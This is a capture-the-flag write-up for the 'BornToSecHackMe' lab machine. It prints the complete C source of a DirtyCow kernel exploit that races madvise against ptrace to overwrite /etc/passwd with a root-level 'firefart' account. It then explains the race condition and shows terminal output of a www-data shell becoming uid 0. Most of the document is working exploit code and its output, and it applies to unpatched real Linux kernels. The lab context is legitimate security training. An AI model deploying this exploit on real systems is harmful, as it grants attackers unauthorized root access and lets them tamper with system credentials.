# Writeup 5 - DirtyCow vulnerability

## Writeups Map

![Imgur](https://i.imgur.com/gb4HAhr.png)

## Summary

- [13. Exploiting DirtyCow](#13-exploiting-dirtycow)
- [14.2 Creating a new root user](#142-creating-a-new-root-user)

## Exploitation

### 13. Exploiting DirtyCow

> All the following steps can lead here:
>
> - [6.1 Getting SSH access as laurie@borntosec](./Writeup1.md#61-getting-ssh-access-as-laurieborntosec)
> - [9.1 Getting a Terminal access as www-data](./Writeup1.md#91-getting-a-terminal-access-as-www-data)
> - [10.2 Getting SSH access as laurie](./Writeup1.md#102-getting-ssh-access-as-laurie)
> - [11.2 Getting SSH access as thor](./Writeup1.md#112-getting-ssh-access-as-thor)
> - [12. Getting SSH access as zaz](./Writeup1.md#12-getting-ssh-access-as-zaz)

After getting any SSH access you can download and use an exploit of the DirtyCow family.

More infos about PoCs [here](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)

First we will download a PoC, compile it and execute it:

```c
// This exploit uses the pokemon exploit of the dirtycow vulnerability
// as a base and automatically generates a new passwd line.
// The user will be prompted for the new password when the binary is run.
// The original /etc/passwd file is then backed up to /tmp/passwd.bak
// and overwrites the root account with the generated line.
// After running the exploit you should be able to login with the newly
// created user.
//
// To use this exploit modify the user values according to your needs.
//   The default is "firefart".
//
// Original exploit (dirtycow's ptrace_pokedata "pokemon" method):
//   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c
//
// Compile with:
//   gcc -pthread dirty.c -o dirty -lcrypt
//
// Then run the newly create binary by either doing:
//   "./dirty" or "./dirty my-new-password"
//
// Afterwards, you can either "su firefart" or "ssh firefart@..."
//
// DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!
//   mv /tmp/passwd.bak /etc/passwd
//
// Exploit adopted by Christian "FireFart" Mehlmauer
// https://firefart.at
//

#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <stdlib.h>
#include <unistd.h>
#include <crypt.h>

const char *filename = "/etc/passwd";
const char *backup_filename = "/tmp/passwd.bak";
const char *salt = "firefart";

int f;
void *map;
pid_t pid;
pthread_t pth;
struct stat st;

// Structure to hold new user information
struct Userinfo {
  char *username;
  char *hash;
  int user_id;
  int group_id;
  char *info;
  char *home_dir;
  char *shell;
};

// Function to generate new user password hash
char *generate_password_hash(char *plaintext_pw) {
 return crypt(plaintext_pw, salt);
}

// Function to generate a line in /etc/passwd format
char *generate_passwd_line(struct Userinfo u) {
 const char *format = "%s:%s:%d:%d:%s:%s:%s\n";
 int size = snprintf(NULL, 0, format, u.username, u.hash,
   u.user_id, u.group_id, u.info, u.home_dir, u.shell);
 char *ret = malloc(size + 1);
 sprintf(ret, format, u.username, u.hash, u.user_id,
   u.group_id, u.info, u.home_dir, u.shell);
 return ret;
}

// Thread function to advise the kernel about memory usage
void *madviseThread(void *arg) {
 int i, c = 0;
 for(i = 0; i < 200000000; i++) {
   c += madvise(map, 100, MADV_DONTNEED);
 }
 printf("madvise %d\n\n", c);
}

// Function to copy a file
int copy_file(const char *from, const char *to) {
 if(access(to, F_OK) != -1) {
   printf("File %s already exists! Please delete it and run again\n",
     to);
   return -1;
 }

 char ch;
 FILE *source, *target;

 source = fopen(from, "r");
 if(source == NULL) {
   return -1;
 }
 target = fopen(to, "w");
 if(target == NULL) {
    fclose(source);
    return -1;
 }

 // Copy the content from source file to target file
 while((ch = fgetc(source)) != EOF) {
    fputc(ch, target);
  }

 printf("%s successfully backed up to %s\n",
   from, to);

 fclose(source);
 fclose(target);

 return 0;
}

// Main function
int main(int argc, char *argv[])
{
 // Backup file
 int ret = copy_file(filename, backup_filename);
 if (ret != 0) {
   exit(ret);
 }

 // Create a new user
 struct Userinfo user;
 user.username = "firefart";
 user.user_id = 0;
 user.group_id = 0;
 user.info = "pwned";
 user.home_dir = "/root";
 user.shell = "/bin/bash";

 char *plaintext_pw;

 // Ask for password from user
 if (argc >= 2) {
   plaintext_pw = argv[1];
   printf("Please enter the new password: %s\n", plaintext_pw);
 } else {
   plaintext_pw = getpass("Please enter the new password: ");
 }

 // Generate password hash and /etc/passwd line
 user.hash = generate_password_hash(plaintext_pw);
 char *complete_passwd_line = generate_passwd_line(user);
 printf("Complete line:\n%s\n", complete_passwd_line);

 // Open /etc/passwd file and map its memory
 f = open(filename, O_RDONLY);
 fstat(f, &st);
 map = mmap(NULL,
            st.st_size + sizeof(long),
            PROT_READ,
            MAP_PRIVATE,
            f,
            0);
 printf("mmap: %lx\n",(unsigned long)map);

 pid = fork();
 if(pid) {
   // In parent process, wait for child process to pause
   // then write the new line into the mapped memory
   waitpid(pid, NULL, 0);
   int u, i, o, c = 0;
   int l=strlen(complete_passwd_line);
   for(i = 0; i < 10000/l; i++) {
     for(o = 0; o < l; o++) {
       for(u = 0; u < 10000; u++) {
         c += ptrace(PTRACE_POKETEXT,
                     pid,
                     map + o,
                     *((long*)(complete_passwd_line + o)));
       }
     }
   }
   printf("ptrace %d\n",c);
 }
 else {
   // In child process, create a new thread to run madviseThread
   // then pause itself
   pthread_create(&pth,
                  NULL,
                  madviseThread,
                  NULL);
   ptrace(PTRACE_TRACEME);
   kill(getpid(), SIGSTOP);
   pthread_join(pth,NULL);
 }

 printf("Done! Check %s to see if the new user was created.\n", filename);
 printf("You can log in with the username '%s' and the password '%s'.\n\n",
   user.username, plaintext_pw);
 printf("\nDON'T FORGET TO RESTORE! $ mv %s %s\n",
   backup_filename, filename);
 return 0;
}
```

So what's happening here ?

The program maps the /etc/passwd file into a READONLY memory zone, then fork

The child process creates a thread that runs madvise() with MADV_DONTNEED on the mapped memory, and then pauses itself after calling ptrace(PTRACE_TRACEME) to allow the parent process to ptrace() it

The madvise syscall advises the kernel that the mapped memory of /etc/passwd won't be used in the near future and can then be unloaded from memory cache

As soon as the child process SIGSTOP itself, the parent process doesn't wait() anymore and try to write the new line into the READONLY mapped memory of /etc/passwd using ptrace() with PTRACE_POKETEXT

If a race condition occurs, the parent process will be able to write into the READONLY mapped memory while the kernel unload it from cache

### 14.2 Creating a new root user

We can compile this code on our machine and upload it to the server using scp, next we execute it

```text
www-data@BornToSecHackMe:/tmp$ chmod +x dirtycow
www-data@BornToSecHackMe:/tmp$ ./dirtycow
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password:
Complete line:
firefart:fiDFcnMz5E5z6:0:0:pwned:/root:/bin/bash

mmap: b7ffe000

madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password '42'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password '42'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
www-data@BornToSecHackMe:/tmp$
www-data@BornToSecHackMe:/tmp$ ls
dirtycow  f  f2  passwd.bak
www-data@BornToSecHackMe:/tmp$ su firefart
Password:
firefart@BornToSecHackMe:/tmp# id
uid=0(firefart) gid=0(root) groups=0(root)
firefart@BornToSecHackMe:/tmp# ls /root
README
```
